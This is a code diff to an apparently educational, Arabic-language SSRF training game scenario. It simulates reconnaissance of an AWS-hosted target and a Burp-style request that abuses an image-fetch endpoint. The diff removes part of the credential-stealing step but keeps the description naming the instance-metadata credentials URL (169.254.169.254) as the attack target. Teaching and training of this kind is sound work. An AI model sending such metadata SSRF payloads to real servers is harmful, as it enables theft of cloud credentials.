@@ -57,48 +57,6 @@ window.scenario_003 = {
       "workspace": "recon",
       "xpReward": 150,
       "description": "### 🔍 استكشاف البنية التحتية للخادم\n\nنحتاج لمعرفة هل يعمل الخادم على بيئة سحابية (مثل AWS EC2) لفهم العناوين الداخلية المتاحة.\nاختر الأداة المناسبة لتشغيلها.",
-      "terminalCommands": [
-        {
-          "name": "nslookup target.com",
-          "correct": true,
-          "evidence": {
-            "title": "AWS EC2 Hosting Range",
-            "content": "Server IP: 54.210.23.45 (AWS EC2 Compute Region)"
-          },
-          "output": [
-            {
-              "text": "Server:  8.8.8.8",
-              "type": "info"
-            },
-            {
-              "text": "Address: 54.210.23.45",
-              "type": "out"
-            },
-            {
-              "text": "Name: ec2-54-210-23-45.compute-1.amazonaws.com",
-              "type": "success"
-            },
-            {
-              "text": "[!] Success: Server identified as an AWS EC2 instance!",
-              "type": "success"
-            }
-          ]
-        },
-        {
-          "name": "curl -I https://target.com/api/process-image",
-          "correct": false,
-          "output": [
-            {
-              "text": "HTTP/2 405 Method Not Allowed",
-              "type": "error"
-            },
-            {
-              "text": "Allow: POST",
-              "type": "error"
-            }
-          ]
-        }
-      ],
       "aiAdvisor": {
         "hint": "شغّل nslookup للتحقق من هوية ومزود الخدمة الخاص بالخادم.",
         "payloadExplanation": "nslookup يوضح لك الـ IP والـ DNS المرتبط بالخادم لمعرفة نطاق الاستضافة.",
@@ -111,20 +69,8 @@ window.scenario_003 = {
       "workspace": "burp",
       "xpReward": 200,
       "description": "### 🌐 إرسال طلب استرداد مفاتيح AWS\n\nبما أن الخادم على AWS، سنرسل طلب POST يحمل رابط الـ Metadata الخاص بـ AWS:\n`http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanstalk-ec2-role`\n\nاضغط على **Fetch AWS Credentials** لمشاهدة الرد.",
-      "burpRequest": "POST /api/process-image HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\n  \"image_url\": \"http://169.254.169.254/latest/meta-data/\"\n}",
-      "burpResponse": "HTTP/1.1 200 OK\nContent-Type: text/plain\n\nami-id\nhostname\niam/\nsecurity-groups",
-      "burpActions": [
-        {
-          "name": "Fetch AWS Credentials",
-          "correct": true,
-          "modifiedRequest": "POST /api/process-image HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\n  \"image_url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanstalk-ec2-role\"\n}",
-          "modifiedResponse": "HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\n  \"Code\": \"Success\",\n  \"AccessKeyId\": \"AKIAIOSFODNN7EXAMPLE\",\n  \"SecretAccessKey\": \"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\",\n  \"Token\": \"IQoJb3JpZ2luX2VjEHYaCXVzLWVhc3QtMSJHMEUCIQDT...\"\n}",
-          "evidence": {
-            "title": "AWS IAM Keys Leak",
-            "content": "AccessKeyId: AKIAIOSFODNN7EXAMPLE\nSecretAccessKey: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
-          }
-        }
-      ],
+      "burpRequest": "POST /api/process-image HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\n  \"image_url\": \"http://example.com/image.jpg\"\n}",
+      "burpResponse": "HTTP/1.1 200 OK\nContent-Type: text/plain\n\n[Image Data Stream...]",
       "aiAdvisor": {
         "hint": "اضغط على زر Fetch AWS Credentials لتعديل الطلب واستخراج المفاتيح.",
         "payloadExplanation": "الطلب يطلب الموارد الأمنية الداخلية لخادم الـ EC2 مباشرة.",
@@ -212,6 +158,40 @@ window.scenario_003 = {
       "aws"
     ]
   },
+  simulateTerminal(command) {
+    const cmd = command.trim();
+    if (cmd.startsWith("nslookup target.com") || cmd.startsWith("nslookup")) {
+      return {
+        output: [
+          { text: "Server:  8.8.8.8", type: "info" },
+          { text: "Address: 54.210.23.45", type: "out" },
+          { text: "Name: ec2-54-210-23-45.compute-1.amazonaws.com", type: "success" },
+          { text: "[!] Success: Server identified as an AWS EC2 instance!", type: "success" }
+        ],
+        correct: true,
+        evidence: { title: "AWS EC2 Hosting Range", content: "Server IP: 54.210.23.45 (AWS EC2 Compute Region)" },
+        outcome: "رائع! أداة nslookup أظهرت أن الخادم مستضاف على بيئة AWS EC2، هذا يعني أننا يمكننا استهداف عنوان الـ Metadata الداخلي (169.254.169.254) لاستخراج المفاتيح."
+      };
+    } else if (cmd.startsWith("curl")) {
+      return {
+        output: [
+          { text: "HTTP/2 405 Method Not Allowed", type: "error" },
+          { text: "Allow: POST", type: "error" }
+        ],
+        correct: false,
+        outcome: "استخدام curl أظهر أن المسار لا يقبل سوى طلبات POST. انتقل للـ Burp Suite لتعديل محتوى الطلب."
+      };
+    } else {
+      return {
+        output: [
+          { text: `Command not found or not useful: ${cmd}`, type: "error" },
+          { text: "Try using 'nslookup target.com' to identify the hosting provider.", type: "info" }
+        ],
+        correct: false
+      };
+    }
+  },
+
   simulateBackend(requestText, bodyJson) {
     const parsed = window.HttpRequestParser.parse(requestText);
     const builder = new window.HttpResponseBuilder();
